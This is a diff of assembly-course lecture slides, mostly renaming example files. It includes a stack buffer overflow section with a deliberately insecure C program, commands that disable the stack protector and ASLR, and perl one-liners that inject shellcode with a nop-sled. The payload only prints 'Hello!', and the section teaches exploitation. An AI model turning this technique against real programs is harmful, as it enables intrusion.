@@ -991,7 +991,7 @@ int main(void) {
 \end{frame}
 
 \begin{frame}[fragile,t]
-\frametitle{Example of Static Allocation in Assembly (example-5.S)}
+\frametitle{Example of Static Allocation in Assembly (example-4.S)}
 \mvs
 \begin{gascode}
 # Put some instructions in .text
@@ -1020,11 +1020,11 @@ _start:
 \end{frame}
 
 \begin{frame}[fragile,t]
-\frametitle{Example of Static Allocation in Assembly (example-5.S) Disassembly}
+\frametitle{Example of Static Allocation in Assembly (example-4.S) Disassembly}
 \mvs
 \begin{customobjdumpcode}
-$ as example-5.S -o example-5.o && ld example-5.o -o example-5 &&
-   objdump -D example-5
+$ as example-4.S -o example-4.o && ld example-4.o -o example-4 &&
+   objdump -D example-4
 
 Disassembly of section .text:
 
@@ -1051,7 +1051,7 @@ Disassembly of section .rodata:
 \end{frame}
 
 \begin{frame}[fragile,t]
-\frametitle{Example of Static Allocation in Assembly (example-5.S) Disassembly}
+\frametitle{Example of Static Allocation in Assembly (example-4.S) Disassembly}
 \mvs
 \begin{customobjdumpcode}
 Disassembly of section .data:
@@ -1085,10 +1085,10 @@ Disassembly of section .bss:
   \item We can also view the program's sections with {\ttfamily objdump -x}.
 \end{itemize}
 \begin{textcode*}{fontsize=\fontsize{9}{8}}
-$ objdump -x example-5
+$ objdump -x example-4
 
-example-5:     file format elf32-i386
-example-5
+example-4:     file format elf32-i386
+example-4
 architecture: i386, flags 0x00000112:
 EXEC_P, HAS_SYMS, D_PAGED
 start address 0x08048074
@@ -1172,7 +1172,7 @@ Disassembly of section .text:
 \end{frame}
 
 \begin{frame}[fragile,t]
-\frametitle{Example of Indirectly Accessing Memory (example-6.S)}
+\frametitle{Example of Indirectly Accessing Memory (example-5.S)}
 \mvs
 \begin{gascode}
 .section .text
@@ -1200,10 +1200,10 @@ _start:
 \end{frame}
 
 \begin{frame}[fragile,t]
-\frametitle{Example of Indirectly Accessing Memory (example-6.S) Disassembly}
+\frametitle{Example of Indirectly Accessing Memory (example-5.S) Disassembly}
 \begin{customobjdumpcode}
-$ as example-6.S -o example-6.o && ld example-6.o -o example-6 &&
-   objdump -D example-6
+$ as example-5.S -o example-5.o && ld example-5.o -o example-5 &&
+   objdump -D example-5
 
 Disassembly of section .text:
 08048074 <_start>:
@@ -1416,7 +1416,7 @@ int main(void) {
 \end{frame}
 
 \begin{frame}[fragile,t]
-\frametitle{Example of Stack Usage (example-8.S)}
+\frametitle{Example of Stack Usage (example-6.S)}
 \mvs
 \begin{gascode}
 # Stack is now
@@ -1448,7 +1448,7 @@ popl %ebx           # Pop dword off of the stack,
 \end{frame}
 
 \begin{frame}[fragile,t]
-\frametitle{Example of Stack Usage (example-8.S)}
+\frametitle{Example of Stack Usage (example-6.S)}
 \mvs
 \begin{gascode}
 # Stack is now
@@ -1477,10 +1477,10 @@ movl $0xaaaaaaaa, (%esp)  # Write 0xaaaaaaaa to the stack
 \end{frame}
 
 \begin{frame}[fragile,t]
-\frametitle{Example of Stack Usage (example-8.S) Disassembly}
+\frametitle{Example of Stack Usage (example-6.S) Disassembly}
 \begin{customobjdumpcode}
-$ as example-8.S -o example-8.o && ld example-8.o -o example-8 &&
-   objdump -D example-8
+$ as example-6.S -o example-6.o && ld example-6.o -o example-6 &&
+   objdump -D example-6
 
 Disassembly of section .text:
 
@@ -1588,7 +1588,7 @@ Disassembly of section .text:
 
 \begin{frame}[fragile,t]
 \mvs
-\frametitle{Example of {\ttfamily cdecl} Calling Convention (example-9.S)}
+\frametitle{Example of {\ttfamily cdecl} Calling Convention (example-7.S)}
 \begin{gascode}
 .section .text
   # sumThreeNumbers(*magicNumber, 5, 12);
@@ -1873,7 +1873,7 @@ $
 \end{frame}
 
 \begin{frame}[fragile,t]
-\frametitle{Example of using the Frame Pointer (example-11.S)}
+\frametitle{Example of using the Frame Pointer (example-8.S)}
 \mvs
 \begin{gascode*}{textsize=\textsize{9}{8}}
 .section .text
@@ -1900,7 +1900,7 @@ _start:
 \end{frame}
 
 \begin{frame}[fragile,t]
-\frametitle{Example of using the Frame Pointer (example-11.S)}
+\frametitle{Example of using the Frame Pointer (example-8.S)}
 \mvs
 \begin{gascode*}{textsize=\textsize{9}{8}}
     sumLoop:
@@ -2181,7 +2181,7 @@ $
 \end{frame}
 
 \begin{frame}[fragile,t]
-\frametitle{Example of System Calls (example-13.S)}
+\frametitle{Example of System Calls (example-9.S)}
 \mvs
 \begin{gascode}
 .section .text
@@ -2211,7 +2211,7 @@ _start:
 \end{frame}
 
 \begin{frame}[fragile,t]
-\frametitle{Example of System Calls (example-13.S)}
+\frametitle{Example of System Calls (example-9.S)}
 \mvs
 \begin{gascode}
   # syscall exit(0);
@@ -2227,12 +2227,12 @@ _start:
 \end{frame}
 
 \begin{frame}[fragile,t]
-\frametitle{Example of System Calls (example-13.S) Runtime}
+\frametitle{Example of System Calls (example-9.S) Runtime}
 \mvs
 \begin{textcode}
-$ as example-13.S -o example-13.o
-$ ld example-13.o -o example-13
-$ ./example-13
+$ as example-9.S -o example-9.o
+$ ld example-9.o -o example-9
+$ ./example-9
 $ cat foo
 Hello World!
 $
@@ -2240,11 +2240,11 @@ $
 \end{frame}
 
 \begin{frame}[fragile,t]
-\frametitle{Example of System Calls (example-13.S) Disassembly}
+\frametitle{Example of System Calls (example-9.S) Disassembly}
 \mvs
 \begin{customobjdumpcode*}{textsize=\textsize{9}{8}}
-$ as example-13.S -o example-13.o && ld example-13.o -o example-13 &&
-   ojbdump -D example-13
+$ as example-9.S -o example-9.o && ld example-9.o -o example-9 &&
+   ojbdump -D example-9
 
 Disassembly of section .text:
 08048074 <_start>:
@@ -2431,7 +2431,7 @@ unlink,10
 
 \begin{frame}[fragile,t]
 \mvs
-\frametitle{Example 1 of String Instructions (example-15.S)}
+\frametitle{Example 1 of String Instructions (example-10.S)}
 \begin{gascode}
 _start:
   cld               # Clear DF, we want to post-increment
@@ -2463,7 +2463,7 @@ _start:
 
 \begin{frame}[fragile,t]
 \mvs
-\frametitle{Example 1 of String Instructions (example-15.S) Continued}
+\frametitle{Example 1 of String Instructions (example-10.S) Continued}
 \begin{gascode}
 .section .bss
   .comm str1, 8
@@ -2500,7 +2500,7 @@ _start:
 
 \begin{frame}[fragile,t]
 \mvs
-\frametitle{Example 2 of String Instructions (example-16.S)}
+\frametitle{Example 2 of String Instructions (example-11.S)}
 \begin{gascode}
 .section .text
 .global main
@@ -2527,7 +2527,7 @@ main:
 
 \begin{frame}[fragile,t]
 \mvs
-\frametitle{Example 2 of String Instructions (example-16.S) Continued}
+\frametitle{Example 2 of String Instructions (example-11.S) Continued}
 \begin{gascode}
 # void *memset(void *s, int c, size_t n);
 asm_memset:
@@ -2555,11 +2555,11 @@ asm_memset:
 
 \begin{frame}[fragile,t]
 \mvs
-\frametitle{Example 2 of String Instructions (example-16.S) Runtime}
+\frametitle{Example 2 of String Instructions (example-11.S) Runtime}
 \begin{textcode}
-$ as example-16.S -o example-16
-$ gcc example-16.o -o example-16
-$ ./example-16
+$ as example-11.S -o example-11
+$ gcc example-11.o -o example-11
+$ ./example-11
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 $
 \end{textcode}
@@ -2705,7 +2705,7 @@ loop:
 
 \begin{frame}[fragile,t]
 \mvs
-\frametitle{Example of using libc in Assembly (example-17.S)}
+\frametitle{Example of using libc in Assembly (example-12.S)}
 \begin{gascode}
 .section .text
 .global main
@@ -2732,7 +2732,7 @@ main:
 
 \begin{frame}[fragile,t]
 \mvs
-\frametitle{Example of using libc in Assembly (example-17.S) Continued}
+\frametitle{Example of using libc in Assembly (example-12.S) Continued}
 \begin{gascode}
   # printf("%s\n", %eax);
   pushl %eax
@@ -2748,9 +2748,9 @@ main:
 \end{gascode}
 {\small Runtime:}
 \begin{textcode}
-$ as example-17.S -o example-17.o
-$ gcc example-17.o -o example-17
-$ ./example-17
+$ as example-12.S -o example-12.o
+$ gcc example-12.o -o example-12
+$ ./example-12
 Wed Jan 25 16:13:27 2012
 $
 \end{textcode}
@@ -2773,7 +2773,7 @@ $
 \section{Advanced Topic 15: Stack-based Buffer Overflows}
 
 \begin{frame}[fragile,t]
-\frametitle{Classic Insecure Example in C (example-18.c)}
+\frametitle{Classic Insecure Example in C (example-insecure.c)}
 \begin{ccode}
 #include <stdio.h>
 
@@ -2790,7 +2790,7 @@ int main(void) {
 \end{ccode}
 \vs
 \begin{textcode}
-$ gcc -fno-stack-protector -z execstack example-18.c -o example-18
+$ gcc -fno-stack-protector -z execstack example-insecure.c -o example-insecure
 \end{textcode}
 \begin{itemize}
 \item We'll build this with the GCC stack protector disabled and executable stack (for reasons explained in a few slides)
@@ -2808,7 +2808,7 @@ void get_input(void) {
 \end{ccode}
 \vs
 \begin{customobjdumpcode}
-$ objdump -D example-18
+$ objdump -D example-insecure
 08048414 <get_input>:
                               # Function prologue
  8048414: 55                  push   %ebp
@@ -2889,12 +2889,12 @@ int main(void) {
 }
 \end{ccode}
 \begin{textcode}
-$ gcc example-19.c -o example-19
-$ ./example-19
+$ gcc example-addrstack.c -o example-addrstack
+$ ./example-addrstack
 0xbfe3d16f
-$ ./example-19
+$ ./example-addrstack
 0xbfdef6ff
-$ ./example-19
+$ ./example-addrstack
 0xbfefbecf
 \end{textcode}
 \pause
@@ -2914,11 +2914,11 @@ $ ./example-19
 \vs
 \begin{textcode}
 $ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
-$ ./example-19
+$ ./example-addrstack
 0xbffff28f
-$ ./example-19
+$ ./example-addrstack
 0xbffff28f
-$ ./example-19
+$ ./example-addrstack
 0xbffff28f
 \end{textcode}
 \begin{itemize}
@@ -2949,7 +2949,7 @@ $ ./example-19
 \end{frame}
 
 \begin{frame}[fragile,t]
-\frametitle{Hello Shellcode Take 1 (example-20.S)}
+\frametitle{Hello Shellcode Take 1 (example-shellcode1.S)}
 \mvs
 \begin{gascode}
 _start:
@@ -2973,17 +2973,17 @@ get_str_addr:
   .ascii "Hello!"
 \end{gascode}
 \begin{textcode}
-$ as example-20.S -o example-20.o && ld example-20. o -o example-20
-$ ./example-20
+$ as example-shellcode1.S -o example-shellcode1.o && ld example-shellcode1. o -o example-shellcode1
+$ ./example-shellcode1
 Hello!$
 \end{textcode}
 \end{frame}
 
 \begin{frame}[fragile,t]
-\frametitle{Hello Shellcode Take 1 (example-20.S) Disassembly}
+\frametitle{Hello Shellcode Take 1 (example-shellcode1.S) Disassembly}
 \mvs
 \begin{customobjdumpcode}
-$ objdump -D example-20
+$ objdump -D example-shellcode1
 Disassembly of section .text:
 08048054 <_start>:
  8048054: eb 19                 jmp    804806f <get_str_addr>
@@ -3010,7 +3010,7 @@ Disassembly of section .text:
 \end{frame}
 
 \begin{frame}[fragile,t]
-\frametitle{Hello Shellcode Take 2 (example-21.S)}
+\frametitle{Hello Shellcode Take 2 (example-shellcode2.S)}
 \mvs
 \begin{gascode*}{textsize=\textsize{9}{8}}
 _start:
@@ -3038,17 +3038,17 @@ get_str_addr:
   .ascii "Hello!"
 \end{gascode*}
 \begin{textcode*}{textsize=\textsize{9}{8}}
-$ as example-21.S -o example-21.o && ld example-21.o -o example-21
-$ ./example-21
+$ as example-shellcode2.S -o example-shellcode2.o && ld example-shellcode2.o -o example-shellcode2
+$ ./example-shellcode2
 Hello!$
 \end{textcode*}
 \end{frame}
 
 \begin{frame}[fragile,t]
-\frametitle{Hello Shellcode Take 2 (example-21.S) Disassembly}
+\frametitle{Hello Shellcode Take 2 (example-shellcode2.S) Disassembly}
 \mvs
 \begin{customobjdumpcode}
-$ objdump -D example-21
+$ objdump -D example-shellcode2
 Disassembly of section .text:
 08048054 <_start>:
  8048054: eb 14                 jmp    804806a <get_str_addr>
@@ -3107,9 +3107,9 @@ Disassembly of section .text:
   \item First, find out how many A's it takes to break it...
 \end{itemize}
 \begin{textcode}
-$ perl -e 'print "A" x 107' | ./example-18
+$ perl -e 'print "A" x 107' | ./example-insecure
 input:
-$ perl -e 'print "A" x 108' | ./example-18
+$ perl -e 'print "A" x 108' | ./example-insecure
 input:
 Segmentation fault
 $
@@ -3120,7 +3120,7 @@ $
 \end{itemize}
 
 \begin{textcode}
-$ gdb example-18
+$ gdb example-insecure
 ...
 
 <input 113 A's>
@@ -3134,7 +3134,7 @@ Program received signal SIGSEGV, Segmentation fault.
 \end{frame}
 
 \begin{frame}[fragile,t]
-\frametitle{The Actual Exploit... Continued}
+\frametitle{The Actual Exploit... (example-insecure\_exploit.sh) Continued}
 \mvs
 \begin{textcode*}{textsize=\textsize{8}{8}}
 Prepare small nop-sled, shellcode, A's, and return address that is
@@ -3150,7 +3150,7 @@ $ perl -e 'print "\x90" x 20 . "\xeb\x14\x59\x31\xc0\x31\xdb\x31\xd2\x43
 Guess at the return address, starting at 0xbffff280:
 $ perl -e 'print "\x90" x 20 . "\xeb\x14\x59\x31\xc0\x31\xdb\x31\xd2\x43
  \x04\x04\x80\xc2\x06\xcd\x80\x31\xc0\x40\xcd\x80\xe8\xe7\xff\xff\xff
- \x48\x65\x6c\x6c\x6f\x21" . "A" x 59 . "\x80\xf2\xff\xbf"' | ./example-18
+ \x48\x65\x6c\x6c\x6f\x21" . "A" x 59 . "\x80\xf2\xff\xbf"' | ./example-insecure
 input:
 Segmentation fault
 \end{textcode*}
@@ -3158,7 +3158,7 @@ Segmentation fault
 \begin{textcode*}{textsize=\textsize{8}{8}}
 $ perl -e 'print "\x90" x 20 . "\xeb\x14\x59\x31\xc0\x31\xdb\x31\xd2\x43
  \x04\x04\x80\xc2\x06\xcd\x80\x31\xc0\x40\xcd\x80\xe8\xe7\xff\xff\xff
- \x48\x65\x6c\x6c\x6f\x21" . "A" x 59 . "\x70\xf2\xff\xbf"' | ./example-18
+ \x48\x65\x6c\x6c\x6f\x21" . "A" x 59 . "\x70\xf2\xff\xbf"' | ./example-insecure
 input:
 Illegal instruction
 \end{textcode*}
@@ -3166,7 +3166,7 @@ Illegal instruction
 \begin{textcode*}{textsize=\textsize{8}{8}}
 $ perl -e 'print "\x90" x 20 . "\xeb\x14\x59\x31\xc0\x31\xdb\x31\xd2\x43
  \x04\x04\x80\xc2\x06\xcd\x80\x31\xc0\x40\xcd\x80\xe8\xe7\xff\xff\xff
- \x48\x65\x6c\x6c\x6f\x21" . "A" x 59 . "\x60\xf2\xff\xbf"' | ./example-18
+ \x48\x65\x6c\x6c\x6f\x21" . "A" x 59 . "\x60\xf2\xff\xbf"' | ./example-insecure
 input:
 Hello!$
 \end{textcode*}
@@ -3236,7 +3236,7 @@ Hello!$
 \end{frame}
 
 \begin{frame}[fragile,t]
-\frametitle{Side-by-side Hello World Syscall Example (example-22.asm)}
+\frametitle{Side-by-side Hello World Syscall Example (example-hello-nasm.asm)}
 \mvs \mvs
 \begin{columns}[T]
 \column{0.5\textwidth}
@@ -3297,7 +3297,7 @@ _start:
 \end{frame}
 
 \begin{frame}[fragile,t]
-\frametitle{Side-by-side Hello World Syscall Example (example-22.asm) Continued}
+\frametitle{Side-by-side Hello World Syscall Example (example-hello-nasm.asm) Continued}
 \mvs
 \begin{columns}[T]
 \column{0.5\textwidth}
@@ -3321,16 +3321,16 @@ message:    .ascii "Hello World!\n"
 
 section .data
 filename:   db 'foo',0
-message:    db 'Hello World!',10,0
+message:    db 'Hello World!',10
 messageLen: equ $ - message
 \end{nasmcode*}
 \end{columns}
 \vs
 {\footnotesize Runtime:}
 \begin{textcode}
-$ nasm -f elf example-22.asm -o example-22.o
-$ ld example-22.o -o example-22
-$ ./example-22
+$ nasm -f elf example-hello-nasm.asm -o example-hello-nasm.o
+$ ld example-hello-nasm.o -o example-hello-nasm
+$ ./example-hello-nasm
 $ cat foo
 Hello World!
 $
@@ -3406,7 +3406,7 @@ $
     \item Add find and remove to Linked List example ({\ttfamily linked\_list.S})
     \item Modify Fibonacci to print with syscalls instead of {\ttfamily printf()}, ({\ttfamily fibonacci.S})
     \item Write a recursive Fibonacci Sequence generator
-    \item Modify exploit shellcode to print a newline ({\ttfamily example-21.S})
+    \item Modify exploit shellcode to print a newline ({\ttfamily example-shellcode2.S})
   \end{itemize}
   \item Write your own syscall, e.g. rot13
   \item Do Stack Smashing challenges: \\ {\footnotesize \url{http://community.corest.com/~gera/InsecureProgramming/}}
